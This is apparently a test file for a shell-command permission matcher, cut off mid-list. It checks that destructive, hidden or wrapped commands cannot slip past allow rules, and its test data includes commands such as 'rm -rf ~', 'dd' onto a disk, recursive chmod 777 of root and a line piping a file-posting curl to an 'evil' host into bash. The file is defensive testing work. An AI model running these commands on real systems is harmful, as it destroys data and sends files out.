/**
 * Issue #28 P1a — rules language, refused-prefix list, arity suggestion and the
 * AST shell matcher (compound commands, substitutions, wrappers, floors).
 */
import { describe, expect, it } from "vitest";
import {
  canonicalRuleSpecifier,
  formatRuleSpecifier,
  isRuleSpecifier,
  matchesMcpTool,
  matchesWebFetchHost,
  normalizeRuleSpecifierInput,
  parseRuleSpecifier,
  RuleSpecifierError,
} from "../rules/rule-specifier.js";
import { refusedShellPrefix, suggestShellPrefix } from "../rules/shell-prefix-policy.js";
import { isDestructiveShellArgv } from "../rules/shell-prefix-values.js";
import {
  analyzeShellForRules,
  evaluateShellRules,
  type ShellRuleInput,
  type ShellRuleSet,
} from "../rules/shell-rule-matcher.js";

function bash(pattern: string): ShellRuleInput {
  const spec = parseRuleSpecifier(pattern);
  if (spec.kind !== "bash") throw new Error("not bash");
  return { pattern, spec };
}
function rules(input: { allow?: string[]; deny?: string[]; ask?: string[] }): ShellRuleSet {
  return {
    allow: (input.allow ?? []).map(bash),
    deny: (input.deny ?? []).map(bash),
    ask: (input.ask ?? []).map(bash),
  };
}

describe("rule specifier grammar", () => {
  it("round-trips every kind in canonical form", () => {
    for (const text of [
      "Bash(git status *)",
      "Bash(npm test)",
      "Edit(/home/u/project/**)",
      "Edit(/home/u/project/a.txt)",
      "WebFetch(domain:example.com)",
      "WebFetch(domain:*.example.com)",
      "Mcp(github)",
      "Mcp(github:create_issue)",
    ]) {
      expect(formatRuleSpecifier(parseRuleSpecifier(text))).toBe(text);
      expect(canonicalRuleSpecifier(text)).toBe(text);
    }
  });

  it("classifies legacy glob patterns by shape and leaves them alone", () => {
    expect(isRuleSpecifier("web_fetch")).toBe(false);
    expect(isRuleSpecifier("write_file:path:/a(b)")).toBe(false);
    expect(isRuleSpecifier("mcp_*")).toBe(false);
    expect(isRuleSpecifier("Bash(ls *)")).toBe(true);
  });

  it.each([
    ["Bash(*)", /bare \*/],
    ["Bash()", /empty/],
    ["Bash(git  status)", /single spaces/],
    ["Bash(git st*)", /shell syntax or a wildcard/],
    ["Bash(ls; rm *)", /shell syntax/],
    ["Bash(echo $(id) *)", /shell syntax/],
    ["Edit(relative/**)", /absolute/],
    ["Edit(/a/../b/**)", /normalized/],
    ["Edit(/a/*.ts)", /trailing \/\*\*/],
    ["WebFetch(example.com)", /domain:/],
    ["WebFetch(domain:*.com)", /registrable/],
    ["WebFetch(domain:a.*.com)", /invalid host/],
    ["WebFetch(domain:Example.com)", /lower case/],
    ["Mcp(a b)", /server id/],
    ["Read(/x)", /expected/],
  ])("rejects %s", (text, message) => {
    expect(() => parseRuleSpecifier(text)).toThrow(RuleSpecifierError);
    expect(() => parseRuleSpecifier(text)).toThrow(message);
  });

  it("matches hosts and MCP tools exactly (pure matchers for P1c)", () => {
    const host = parseRuleSpecifier("WebFetch(domain:*.example.com)");
    if (host.kind !== "webfetch") throw new Error();
    expect(matchesWebFetchHost(host, "api.example.com")).toBe(true);
    expect(matchesWebFetchHost(host, "example.com")).toBe(false);
    expect(matchesWebFetchHost(host, "evilexample.com")).toBe(false);
    const mcp = parseRuleSpecifier("Mcp(github:create_issue)");
    if (mcp.kind !== "mcp") throw new Error();
    expect(matchesMcpTool(mcp, "github", "create_issue")).toBe(true);
    expect(matchesMcpTool(mcp, "github", "delete_repo")).toBe(false);
  });
});

describe("hand-edited rule normalization (dock preview and host save)", () => {
  it.each([
    ["Bash( git status )", "Bash(git status)"],
    ["Bash(\tgit\tstatus\t*)", "Bash(git status *)"],
    ["Bash(git   status    *)", "Bash(git status *)"],
    ["  Bash( \t npm  run   test * )  ", "Bash(npm run test *)"],
  ])("normalizes %j to the formatter's canonical spelling", (typed, canonical) => {
    expect(normalizeRuleSpecifierInput(typed)).toBe(canonical);
    expect(canonicalRuleSpecifier(normalizeRuleSpecifierInput(typed))).toBe(canonical);
  });

  it("leaves a rule empty after trimming invalid", () => {
    expect(normalizeRuleSpecifierInput("Bash( \t )")).toBe("Bash()");
    expect(() => parseRuleSpecifier(normalizeRuleSpecifierInput("Bash( \t )"))).toThrow(RuleSpecifierError);
  });

  it("does not repair anything except Bash whitespace", () => {
    expect(normalizeRuleSpecifierInput("Bash(git\nstatus)")).toBe("Bash(git\nstatus)");
    expect(() => parseRuleSpecifier(normalizeRuleSpecifierInput("Bash(git\nstatus)"))).toThrow(RuleSpecifierError);
    expect(normalizeRuleSpecifierInput(" WebFetch(domain: example.com) ")).toBe("WebFetch(domain: example.com)");
  });

  it("keeps the store parser strict for text that bypasses normalization", () => {
    expect(() => parseRuleSpecifier("Bash( git status )")).toThrow(/single spaces/);
    expect(() => parseRuleSpecifier("Bash(git\tstatus)")).toThrow(/single spaces/);
  });
});

describe("argv-aware destructive floor (review of PR #77)", () => {
  // Each case was allowed under a stored prefix rule before the floor read argv.
  it.each([
    ["Bash(rm *)", "rm -v -r ~/work"],
    ["Bash(rm *)", "rm --recursive --force ~"],
    ["Bash(rm *)", "rm --rec ~/work"],
    ["Bash(rm *)", "rm -i -rf ~"],
    ["Bash(rm *)", "rm -d -R /tmp/x"],
    ["Bash(rm *)", "rm notes.txt -r"],
    ["Bash(rm *)", "rm $FLAGS notes.txt"],
    ["Bash(chmod *)", "chmod -R 777 /"],
    ["Bash(chmod *)", "chmod --recursive u+w /srv"],
    ["Bash(chmod *)", "chmod o+w /etc/hosts"],
    ["Bash(chmod *)", "chmod 0666 shared.txt"],
    ["Bash(chown *)", "chown -R nobody /"],
    ["Bash(chown user *)", "chown user -R /"],
    ["Bash(find *)", "find . -name x -delete"],
    ["Bash(find *)", "find . -exec rm -r {} +"],
    ["Bash(dd *)", "dd if=/dev/zero of=/dev/disk2"],
  ])("%s never allows %s", (pattern, command) => {
    expect(evaluateShellRules(command, rules({ allow: [pattern] })).decision).toBeNull();
  });

  it.each([
    ["Bash(rm *)", "rm notes.txt"],
    ["Bash(chmod +x *)", "chmod +x build.sh"],
    ["Bash(find *)", "find . -name x"],
    ["Bash(rm *)", "rm -- -r"],
  ])("%s still matches the non-destructive %s", (pattern, command) => {
    expect(evaluateShellRules(command, rules({ allow: [pattern] })).decision).toBe("allow");
  });

  it.each([
    [["rm"], "destructive"], [["rm", "notes.txt"], "destructive"], [["/bin/rm", "-f"], "destructive"],
    [["shred"], "destructive"], [["dd"], "destructive"], [["mkfs.ext4"], "destructive"], [["wipefs"], "destructive"],
    [["chmod"], "destructive"], [["chmod", "-R"], "destructive"], [["chmod", "777"], "destructive"],
    [["chown"], "destructive"], [["chown", "-R"], "destructive"], [["chgrp", "--recursive"], "destructive"],
    [["chmod", "+x"], "not-allowlisted"], [["chown", "user"], "not-allowlisted"],
  ])("refuses destructive prefix %j as %s", (tokens, reason) => {
    expect(refusedShellPrefix(tokens)).toBe(reason);
  });

  it("never suggests a destructive prefix", () => {
    expect(suggestShellPrefix(["rm", "notes.txt"])).toBeNull();
    expect(suggestShellPrefix(["chmod", "-R", "u+w", "src"])).toBeNull();
  });
});

describe("irreversible commands never become allow rules (owner decision 2026-10-23)", () => {
  // Each pattern is evaluated as if it had been stored; the store also refuses it (below).
  it.each([
    ["Bash(git clean *)", "git clean -fdx"],
    ["Bash(git clean *)", "git clean -f"],
    ["Bash(git reset *)", "git reset --hard HEAD~1"],
    ["Bash(git reset *)", "git reset --merge"],
    ["Bash(git checkout *)", "git checkout -- ."],
    ["Bash(git checkout *)", "git checkout ."],
    ["Bash(git checkout *)", "git checkout main -- src/app.ts"],
    ["Bash(git checkout *)", "git checkout -f main"],
    ["Bash(git restore *)", "git restore src/app.ts"],
    ["Bash(git restore *)", "git restore --staged --worktree src/app.ts"],
    ["Bash(git stash *)", "git stash drop"],
    ["Bash(git stash *)", "git stash clear"],
    ["Bash(docker system *)", "docker system prune -af"],
    ["Bash(docker volume *)", "docker volume prune"],
    ["Bash(docker volume *)", "docker volume rm data"],
    ["Bash(docker image *)", "docker image prune -a"],
    ["Bash(kubectl delete *)", "kubectl delete pod web"],
    ["Bash(truncate *)", "truncate -s 0 important.db"],
    ["Bash(mv *)", "mv draft.txt final.txt"],
    ["Bash(tee *)", "tee out.txt"],
    ["Bash(unlink *)", "unlink stale.lock"],
    ["Bash(chmod 00777 *)", "chmod 00777 shared"],
    ["Bash(chmod o=u *)", "chmod o=u shared"],
    ["Bash(chmod o=g *)", "chmod o=g shared"],
    ["Bash(chmod *)", "chmod --reference=template shared"],
    ["Bash(chmod u+r,o=u *)", "chmod u+r,o=u shared"],
  ])("%s never allows %s", (pattern, command) => {
    expect(evaluateShellRules(command, rules({ allow: [pattern] })).decision).toBeNull();
  });

  it.each([
    ["Bash(git switch main)", "git switch main"],
    ["Bash(git checkout -b *)", "git checkout -b feature"],
    ["Bash(git clean -n *)", "git clean -n"],
    ["Bash(git restore --staged *)", "git restore --staged src/app.ts"],
    ["Bash(git reset HEAD)", "git reset HEAD"],
    ["Bash(git stash list *)", "git stash list"],
    ["Bash(git stash push *)", "git stash push -m wip"],
    ["Bash(docker image ls *)", "docker image ls"],
    ["Bash(kubectl get *)", "kubectl get pods"],
    ["Bash(chmod 0755 *)", "chmod 0755 build.sh"],
    ["Bash(chmod go-w *)", "chmod go-w shared"],
    ["Bash(chmod u+x *)", "chmod u+x build.sh"],
  ])("control: %s still matches the harmless %s", (pattern, command) => {
    expect(evaluateShellRules(command, rules({ allow: [pattern] })).decision).toBe("allow");
  });

  it.each([
    [["git", "clean"]], [["git", "clean", "-n"]], [["git", "reset"]], [["git", "reset", "HEAD"]],
    [["git", "checkout"]], [["git", "checkout", "main"]], [["git", "restore"]], [["git", "restore", "--staged"]],
    [["git", "stash"]], [["git", "stash", "drop"]], [["git", "stash", "clear"]],
    [["docker", "system"]], [["docker", "volume"]], [["docker", "image"]], [["docker", "image", "prune"]],
    [["docker", "volume", "rm"]], [["kubectl", "delete"]],
    [["truncate"]], [["truncate", "-s"]], [["mv"]], [["tee"]], [["tee", "-a"]], [["unlink"]],
    [["chmod", "00777"]], [["chmod", "o=u"]], [["chmod", "--reference=template"]],
  ])("refuses the wildcard prefix %j", (tokens) => {
    expect(refusedShellPrefix(tokens)).not.toBeNull();
  });

  it.each([
    [["git", "clean", "-fdx"]], [["git", "reset", "--hard"]], [["git", "checkout", "main"]], [["git", "checkout", "README.md"]], [["git", "checkout", "--", "."]], [["git", "restore", "src/app.ts"]],
    [["git", "stash", "drop"]], [["docker", "system", "prune", "-af"]], [["kubectl", "delete", "pod", "web"]],
    [["truncate", "-s", "1M", "data.bin"]], [["mv", "a", "b"]], [["tee", "out.txt"]], [["unlink", "stale.lock"]],
  ])("refuses the exact rule %j", (tokens) => {
    expect(refusedShellPrefix(tokens, false)).toBe("destructive");
  });

  it.each([
    [["kubectl", "get"], false], [["git", "status"], true], [["docker", "ps"], true], [["npm", "run", "build"], false],
    [["git", "stash", "list"], false], [["git", "stash", "push"], false], [["docker", "image", "ls"], false],
    [["git", "switch", "main"], false], [["git", "checkout", "-b", "feature"], false], [["git", "clean", "-n"], false],
    [["git", "restore", "--staged", "src/app.ts"], false], [["git", "reset", "HEAD"], false],
  ])("control: keeps %j storable (wildcard %s)", (tokens, wildcard) => {
    expect(refusedShellPrefix(tokens, wildcard)).toBeNull();
  });

  it("never suggests a prefix that reaches an irreversible form", () => {
    expect(suggestShellPrefix(["git", "clean", "-n"])).toBeNull();
    expect(suggestShellPrefix(["truncate", "-s", "1M", "data.bin"])).toBeNull();
    expect(suggestShellPrefix(["git", "checkout", "main"])).toBeNull();
    expect(suggestShellPrefix(["docker", "image", "prune"])).toBeNull();
    expect(suggestShellPrefix(["git", "stash", "list"])).toBeNull();
  });
});

describe("wildcard allowlist (owner decision 2026-10-23)", () => {
  it.each([
    [["ls"]], [["ls", "-la"]], [["cat"]], [["rg"]], [["find"]], [["git", "status"]], [["git", "log", "--oneline"]],
    [["git", "branch", "--list"]], [["docker", "ps"]],
  ])("allows the catalog wildcard %j", (tokens) => {
    expect(refusedShellPrefix(tokens)).toBeNull();
  });

  it.each([
    [["make"]], [["make", "build"]], [["cargo", "test"]], [["git", "branch"]], [["git", "push"]], [["git", "switch"]],
    [["npm", "run"]], [["npm", "test"]], [["npm", "run", "build"]], [["bun", "run", "lint"]], [["bun", "test"]],
    [["git", "fetch"]], [["git", "fetch", "origin"]], [["gh", "pr"]], [["gh", "repo"]], [["helm", "list"]], [["terraform", "plan"]], [["aws", "s3"]],
    [["kubectl", "apply"]], [["kubectl", "get"]], [["kubectl", "logs"]], [["kubectl", "describe"]], [["docker", "compose"]], [["ln", "-s"]], [["redis-cli"]], [["echo"]],
  ])("refuses the wildcard %j outside the catalog", (tokens) => {
    expect(refusedShellPrefix(tokens)).toBe("not-allowlisted");
  });

  it("keeps structural reasons ahead of the allowlist", () => {
    expect(refusedShellPrefix(["python3"])).toBe("interpreter");
    expect(refusedShellPrefix(["sudo", "ls"])).toBe("wrapper");
    expect(refusedShellPrefix(["rm"])).toBe("destructive");
  });

  it.each([
    [["git", "status", "--short"], ["git", "status"]],
    [["ls", "-la", "src"], ["ls"]],
    [["git", "branch", "--list", "feat/*"], ["git", "branch", "--list"]],
  ])("suggests the catalog prefix for %j", (argv, prefix) => {
    expect(suggestShellPrefix(argv)).toEqual(prefix);
  });

  it.each([
    [["npm", "run"]], [["make", "build"]], [["gh", "pr", "view", "12"]], [["git", "push"]],
    [["npm", "run", "build", "--", "--watch"]], [["npm", "test"]], [["kubectl", "get", "pods", "-n", "web"]], [["bun", "test", "src/app.test.ts"]], [["git", "fetch", "origin"]],
  ])("offers no wildcard for %j", (argv) => {
    expect(suggestShellPrefix(argv)).toBeNull();
  });
});

describe("chmod mode removal is a mode, not an option (round-2 regression)", () => {
  it.each([["chmod", "-x", "script.sh"], ["chmod", "-w", "notes.txt"], ["chmod", "go-w", "shared"], ["chmod", "a-rwx", "secret"]])("does not floor %j", (...argv) => {
    expect(isDestructiveShellArgv(argv)).toBe(false);
    expect(refusedShellPrefix(argv, false)).toBeNull();
  });

  it("refuses an unreadable mode as a stored rule without flooring it", () => {
    expect(isDestructiveShellArgv(["chmod", "u=rw-x", "f"])).toBe(false);
    expect(refusedShellPrefix(["chmod", "u=rw-x", "f"], false)).toBe("destructive");
  });
});

describe("refused prefixes (single shared list)", () => {
  it.each([
    [[], "empty"],
    [["bash"], "shell"],
    [["sh"], "shell"],
    [["/bin/zsh"], "shell"],
    [["python"], "interpreter"],
    [["python3", "-c"], "interpreter"],
    [["/usr/bin/python3.12"], "interpreter"],
    [["node", "-e"], "interpreter"],
    // A script-file prefix runs code the rules cannot read.
    [["python", "scripts/gen.py"], "interpreter"],
    [["node", "scripts/build.mjs"], "interpreter"],
    [["unbuffer"], "wrapper"],
    [["env"], "wrapper"],
    [["env", "FOO=1", "ls"], "wrapper"],
    [["xargs"], "wrapper"],
    [["sudo", "ls"], "wrapper"],
    [["eval"], "wrapper"],
    [["exec"], "wrapper"],
    [["source"], "wrapper"],
    [["timeout"], "wrapper"],
    [["nice"], "wrapper"],
    [["busybox"], "wrapper"],
    [["git", "config"], "config-writer"],
    [["npx"], "package-runner"],
    [["npm", "exec"], "package-runner"],
    [["bun", "x"], "package-runner"],
    [["git"], "multi-verb-tool"],
    [["git", "-c"], "multi-verb-tool"],
    [["npm"], "package-runner"],
    [["pnpm", "exec"], "package-runner"],
    [["yarn", "dlx"], "package-runner"],
    [["deno", "run"], "package-runner"],
    [["corepack", "pnpm"], "package-runner"],
    [["corepack", "pnpm", "dlx"], "package-runner"],
  ])("refuses %j (%s)", (tokens, reason) => {
    expect(refusedShellPrefix(tokens as string[])).toBe(reason);
  });

  it.each([
    [["git", "status"]],
    [["ls"]],
  ])("accepts allowlisted wildcard %j", (tokens) => {
    expect(refusedShellPrefix(tokens as string[])).toBeNull();
  });

  // Structurally bounded runner prefixes stay valid as exact rules, but the
  // wildcard allowlist (owner decision 2026-10-23) keeps them out of " *" rules.
  it.each([
    [["bun", "run"]],
    [["npm", "test"]],
    [["bun", "run", "build"]],
    [["bun", "run", "./x.ts"]],
    [["deno", "task", "build"]],
    [["npx", "prettier"]],
    [["npm", "exec", "prettier"]],
    [["pnpm", "exec", "vitest"]],
    [["yarn", "dlx", "prettier"]],
    [["bun", "exec", "echo"]],
    [["deno", "run", "main.ts"]],
    [["corepack", "pnpm", "dlx", "prettier"]],
  ])("accepts %j as an exact rule but not as a wildcard", (tokens) => {
    expect(refusedShellPrefix(tokens as string[], false)).toBeNull();
    expect(refusedShellPrefix(tokens as string[])).toBe("not-allowlisted");
  });
});

describe("arity-table suggestion", () => {
  it.each([
    [["git", "status", "--short"], ["git", "status"]],
    [["docker", "ps", "-a"], ["docker", "ps"]],
    [["ls", "-la", "src"], ["ls"]],
    [["cat", "README.md"], ["cat"]],
  ])("%j → %j", (argv, expected) => {
    expect(suggestShellPrefix(argv)).toEqual(expected);
  });

  it.each([
    [["git", "commit", "-m", "x"]],
    [["npm", "test", "--", "foo"]],
    [["npm", "run", "build", "--watch"]],
    [["bun", "run", "test:vitest", "a.ts"]],
    [["bash", "-c", "ls"]],
    [["python", "-c", "print(1)"]],
    [["sudo", "ls"]],
    [["git", "-C", "dir", "status"]],
    [[undefined, "x"]],
    [["env", "FOO=1", "ls"]],
  ])("refuses a persistent suggestion for %j", (argv) => {
    expect(suggestShellPrefix(argv as (string | undefined)[])).toBeNull();
  });
});

describe("AST shell matcher", () => {
  it("matches token-wise: `ls *` does not cover `lsof`", () => {
    const set = rules({ allow: ["Bash(ls *)"] });
    expect(evaluateShellRules("ls -la", set).decision).toBe("allow");
    expect(evaluateShellRules("ls", set).decision).toBe("allow");
    expect(evaluateShellRules("lsof -i", set).decision).toBeNull();
  });

  it("exact rules match only the exact argv", () => {
    const set = rules({ allow: ["Bash(npm test)"] });
    expect(evaluateShellRules("npm test", set).decision).toBe("allow");
    expect(evaluateShellRules("npm test -- foo", set).decision).toBeNull();
  });

  it.each([
    ["npx prettier --write src", "Bash(npx prettier *)"],
    ["npm exec prettier --write src", "Bash(npm exec prettier *)"],
    ["pnpm dlx prettier --write src", "Bash(pnpm dlx prettier *)"],
    ["bun exec echo hello", "Bash(bun exec echo *)"],
    ["deno run main.ts", "Bash(deno run main.ts *)"],
    ["corepack pnpm dlx prettier src", "Bash(corepack pnpm dlx prettier *)"],
    ["npx --future value -- prettier src", "Bash(npx --future value -- prettier *)"],
  ])("a full raw runner prefix can cover %j", (command, pattern) => {
    expect(analyzeShellForRules(command)).toMatchObject({ ok: true, hidden: [], ordinaryAsk: "opaque runner prefix", allowBlockers: [] });
    expect(evaluateShellRules(command, rules({ deny: ["Bash(rm *)"], allow: [pattern] })).decision).toBe("allow");
    expect(evaluateShellRules(command, rules({ allow: ["Bash(prettier *)", "Bash(echo *)"] })).decision).toBeNull();
  });

  it("runner options and opaque inner code do not hide the raw command", () => {
    const command = "npx --config project.json -- node script.mjs --output build";
    expect(analyzeShellForRules(command)).toMatchObject({
      ok: true, hidden: [], ordinaryAsk: "opaque runner prefix", allowBlockers: [],
      commands: [{ argv: ["npx", "--config", "project.json", "--", "node", "script.mjs", "--output", "build"], allowBlockers: [] }],
    });
    expect(evaluateShellRules(command, rules({ allow: ["Bash(npx --config project.json -- node *)"] })).decision).toBe("allow");
  });

  it("runner prefixes stay visible to explicit deny and ask rules", () => {
    expect(evaluateShellRules("npx prettier src", rules({ deny: ["Bash(npx prettier *)"] }))).toMatchObject({ decision: "deny", pattern: "Bash(npx prettier *)" });
    expect(evaluateShellRules("npm exec prettier src", rules({ ask: ["Bash(npm exec *)"] }))).toMatchObject({ decision: "ask", pattern: "Bash(npm exec *)" });
    expect(evaluateShellRules("npx prettier src", rules({ deny: ["Bash(prettier *)"] })).decision).toBeNull();
  });

  it("keeps existing nonrunner and wrapper allow-rule behavior", () => {
    expect(evaluateShellRules("git status", rules({ allow: ["Bash(git *)"] })).decision).toBe("allow");
    expect(evaluateShellRules("env A=1 npm test", rules({ allow: ["Bash(env A=1 npm *)"] })).decision).toBe("allow");
  });

  it.each([
    ["python -c 'print(1)'", "python"],
    ["perl -e 'print 1'", "perl"],
    ["node -e 'console.log(1)'", "node"],
    ["node x.js", "node"],
    ["python x.py", "python"],
    ["bash -c ls", "bash"],
    ["pwsh -c Get-Date", "pwsh"],
    ["GIT_SSH_COMMAND='ssh -v' git status", "git"],
    ["env PATH=/tmp/tools git status", "env"],
    ["export PAGER=cat", "export"],
  ])("keeps static hidden code as rule visibility without ordinary approval: %s", (command, program) => {
    const shape = analyzeShellForRules(command);
    expect(shape).toMatchObject({ ok: true });
    if (!shape.ok) throw new Error("Expected a parsed shell command");
    expect(shape.hidden.length).toBeGreaterThan(0);
    expect(shape.ordinaryAsk).toBeUndefined();
    expect(evaluateShellRules(command, rules({ allow: [`Bash(${program} *)`] })).decision).toBeNull();
    for (const restriction of [{ deny: ["Bash(rm *)"] }, { ask: ["Bash(rm *)"] }]) {
      expect(evaluateShellRules(command, rules(restriction))).toMatchObject({ decision: "ask", pattern: null });
    }
  });

  it.each([
    "$COMMAND arg",
    "env $COMMAND arg",
    "python -c \"$CODE\"",
    "node \"$SCRIPT\"",
    "GIT_SSH_COMMAND=\"$COMMAND\" git status",
    "env PATH=\"$RUNTIME_PATH\" git status",
    "export PAGER=\"$COMMAND\"",
    "echo $((count))",
    "case x in x) echo hi;; esac",
    "echo 'unterminated",
  ])("retains ordinary approval for unresolved bindings or analysis: %s", (command) => {
    const shape = analyzeShellForRules(command);
    if (shape.ok) expect(shape.ordinaryAsk).toEqual(expect.any(String));
    else expect(shape.reason).toEqual(expect.any(String));
  });

  it.each([
    ["npx@10 helper", "Bash(npx@10 helper *)"],
    ["npm@10 exec helper", "Bash(npm@10 exec helper *)"],
  ])("keeps versioned runner prefixes ordinary and grantable: %s", (command, pattern) => {
    expect(analyzeShellForRules(command)).toMatchObject({ ok: true, hidden: [], ordinaryAsk: "opaque runner prefix" });
    expect(evaluateShellRules(command, rules({ allow: [pattern] })).decision).toBe("allow");
    expect(evaluateShellRules(command, rules({ allow: ["Bash(helper *)"] })).decision).toBeNull();
  });

  it("requires every subcommand of a compound command to be covered", () => {
    const set = rules({ allow: ["Bash(git status *)", "Bash(ls *)"] });
    expect(evaluateShellRules("git status && ls -la | ls", set)).toMatchObject({ decision: "allow" });
    expect(evaluateShellRules("git status; ls || git status -s", set).decision).toBe("allow");
    expect(evaluateShellRules("git status && curl https://x.test", set).decision).toBeNull();
    expect(evaluateShellRules("(git status) & curl x", set).decision).toBeNull();
    expect(evaluateShellRules("for f in a b; do ls $f; done", set).decision).toBe("allow");
    expect(evaluateShellRules("for f in a b; do rm $f; done", set).decision).toBeNull();
  });

  it("never allows through substitutions, env injection, write redirects or function definitions", () => {
    const set = rules({ allow: ["Bash(echo *)", "Bash(git status *)"] });
    expect(evaluateShellRules("echo $(git status)", set).decision).toBeNull();
    expect(evaluateShellRules("echo `git status`", set).decision).toBeNull();
    expect(evaluateShellRules("GIT_DIR=/tmp/x git status", set).decision).toBeNull();
    expect(evaluateShellRules("PATH=/tmp/evil; git status", set).decision).toBeNull();
    expect(evaluateShellRules("echo hi > ~/.bashrc", set).decision).toBeNull();
    expect(evaluateShellRules("echo hi > /dev/null", set).decision).toBe("allow");
    expect(evaluateShellRules("echo hi 2>&1", set).decision).toBe("allow");
    expect(evaluateShellRules("git() { rm -rf ~; }; git status", set).decision).toBeNull();
    expect(evaluateShellRules("$CMD status", set).decision).toBeNull();
  });

  it("unparseable or unsupported input matches no allow rule", () => {
    const set = rules({ allow: ["Bash(echo *)"] });
    expect(evaluateShellRules("echo 'unterminated", set).decision).toBeNull();
    expect(evaluateShellRules("case x in x) echo hi;; esac", set).decision).toBeNull();
    expect(analyzeShellForRules("echo 'unterminated").ok).toBe(false);
  });

  it("floor: a destructive command is never allowed, whatever the rules say", () => {
    const set = rules({ allow: ["Bash(rm *)", "Bash(chmod *)", "Bash(dd *)"] });
    expect(evaluateShellRules("rm -rf build", set)).toMatchObject({ decision: null, reason: "destructive command (floor)" });
    expect(evaluateShellRules("chmod 777 x", set).decision).toBeNull();
    expect(evaluateShellRules("dd if=/dev/zero of=/dev/disk0", set).decision).toBeNull();
    expect(evaluateShellRules("rm build.log", set).decision).toBe("allow");
  });

  it("deny > ask > allow regardless of order or specificity", () => {
    const set = rules({ allow: ["Bash(git push *)"], ask: ["Bash(git *)"], deny: ["Bash(git push --force *)"] });
    expect(evaluateShellRules("git push --force origin", set)).toMatchObject({ decision: "deny", pattern: "Bash(git push --force *)" });
    expect(evaluateShellRules("git push origin", set)).toMatchObject({ decision: "ask", pattern: "Bash(git *)" });
  });

  it("deny/ask see inside $(), subshells, loops, functions and through wrappers", () => {
    const set = rules({ deny: ["Bash(rm *)"] });
    for (const command of [
      "echo $(rm -f x)",
      "echo `rm x`",
      "(cd /tmp && rm x)",
      "for f in *; do rm \"$f\"; done",
      "while true; do rm x; done",
      "if true; then rm x; fi",
      "f() { rm x; }",
      "cat <(rm x)",
      "sudo rm x",
      "sudo -u root rm x",
      "env A=1 rm x",
      "timeout 5 rm x",
      "/bin/rm x",
      "X=$(rm x)",
    ]) {
      expect(evaluateShellRules(command, set).decision, command).toBe("deny");
    }
    expect(evaluateShellRules("echo rm", set).decision).toBeNull();
  });

  it("asks when a deny/ask rule cannot inspect the command", () => {
    const set = rules({ deny: ["Bash(rm *)"], allow: ["Bash(echo *)"] });
    for (const command of [
      "bash -c 'rm x'",
      "sh -lc 'rm x'",
      "python3 -c 'import os'",
      "eval 'rm x'",
      "find . -exec rm {} ;",
      "$CMD x",
      "echo 'unterminated",
      "case x in x) rm y;; esac",
    ]) {
      expect(evaluateShellRules(command, set), command).toMatchObject({ decision: "ask", pattern: null });
    }
    // Without any deny/ask rule, the same input is simply not allowed.
    expect(evaluateShellRules("bash -c 'rm x'", rules({ allow: ["Bash(echo *)"] })).decision).toBeNull();
    // deny > ask: a deny match on a visible command is not demoted by hidden code.
    expect(evaluateShellRules("eval rm x", set)).toMatchObject({ decision: "deny", pattern: "Bash(rm *)" });
    expect(evaluateShellRules("rm x; bash -c 'ls'", set)).toMatchObject({ decision: "deny", pattern: "Bash(rm *)" });
  });

  it("security review: wrappers cannot hide code from deny rules", () => {
    const set = rules({ deny: ["Bash(rm *)"] });
    for (const command of [
      "env sh -c 'rm x'",
      "nohup bash -c 'rm x'",
      "timeout 5 sh -c 'rm x'",
      "xargs -I{} sh -c 'rm {}'",
      "xargs -I {} sh -c 'rm {}'",
      "sudo -u root bash -c 'rm x'",
      "env -S 'rm -rf x'",
      "su -c 'rm x'",
      "busybox sh -c 'rm x'",
    ]) {
      expect(evaluateShellRules(command, set), command).toMatchObject({ decision: "ask", pattern: null });
    }
    expect(evaluateShellRules("busybox rm -rf x", set).decision).toBe("deny");
    expect(evaluateShellRules("env A=1 busybox rm x", set).decision).toBe("deny");
  });

  it("security review: deny/ask see through a multi-verb tool's global options", () => {
    const set = rules({ deny: ["Bash(git push *)"], ask: ["Bash(kubectl delete *)"] });
    expect(evaluateShellRules("git -C . push origin", set).decision).toBe("deny");
    expect(evaluateShellRules("git -c core.x=1 --no-pager push", set).decision).toBe("deny");
    expect(evaluateShellRules("kubectl -n prod delete pod x", set).decision).toBe("ask");
    expect(evaluateShellRules("git -C . status", set).decision).toBeNull();
  });

  it("security review: an option that writes to a path disqualifies an allow", () => {
    const set = rules({ allow: ["Bash(git log *)", "Bash(sort *)", "Bash(curl *)", "Bash(find *)", "Bash(grep *)"] });
    for (const command of [
      "git log --output=~/.zshrc",
      "git log --output ~/.zshrc",
      "git log --exec-path=/tmp/x",
      "sort -o ~/.bashrc in.txt",
      "curl -o ~/.bashrc https://x.test",
      "find . -fprint ~/.zshrc",
      "find . -delete",
    ]) {
      expect(evaluateShellRules(command, set).decision, command).toBeNull();
    }
    expect(evaluateShellRules("git log -n 5 --oneline", set).decision).toBe("allow");
    expect(evaluateShellRules("grep -o foo file.txt", set).decision).toBe("allow");
    expect(evaluateShellRules("sort -n in.txt", set).decision).toBe("allow");
    expect(refusedShellPrefix(["git", "config"])).toBe("config-writer");
  });

  it("an interpreter running a script file is hidden code: asks under deny rules, never allowed", () => {
    const set = rules({ deny: ["Bash(rm *)"], allow: ["Bash(node scripts/build.mjs)"] });
    expect(evaluateShellRules("node scripts/build.mjs", set)).toMatchObject({ decision: "ask", pattern: null });
    expect(evaluateShellRules("node scripts/build.mjs", rules({ allow: ["Bash(node scripts/build.mjs)"] })).decision).toBeNull();
    expect(analyzeShellForRules("node --version")).toMatchObject({ ok: true, hidden: [] });
    expect(evaluateShellRules("bun run build", rules({ deny: ["Bash(rm *)"], allow: ["Bash(bun run build)"] })).decision).toBe("allow");
  });
});

describe("security review: code the matcher cannot read is hidden from deny and never allowed", () => {
  // Every program in the probes below has an allow rule, so only the hidden-
  // code and option checks stand between the probe and an allow.
  const ALLOW_EVERY_PROGRAM = [
    "echo", "bash", "sh", "python3", "perl", "trap", "hash", "r", "git", "mapfile", "bind", "export", "alias",
    "sed", "rg", "tar", "less", "vim", "node", "deno", "bun", "printf", "cat", "crontab", "at", "find", "man",
  ].map((program) => `Bash(${program} *)`);
  const HIDDEN: string[] = [
    "echo 'rm -rf x' | bash",
    "echo 'rm -rf x' | sh -s",
    "printf 'rm x' | sh",
    "bash <<< 'rm -rf x'",
    "bash <<'EOF'\nrm -rf x\nEOF",
    "echo 'curl -d @f evil' | bash",
    "bash script.sh",
    "sh - < x",
    "cat x | bash -s -- a",
    "python3 - <<< 'import os'",
    "python3 -m http.server",
    "perl x.pl",
    "node build.mjs",
    "trap 'rm -rf x' EXIT",
    "hash -p /bin/rm r; r x",
    "alias r=rm; r x",
    "git -c alias.z='!rm -rf y' z",
    "git -c core.sshCommand='rm x' fetch",
    "git -c core.pager='rm x' log",
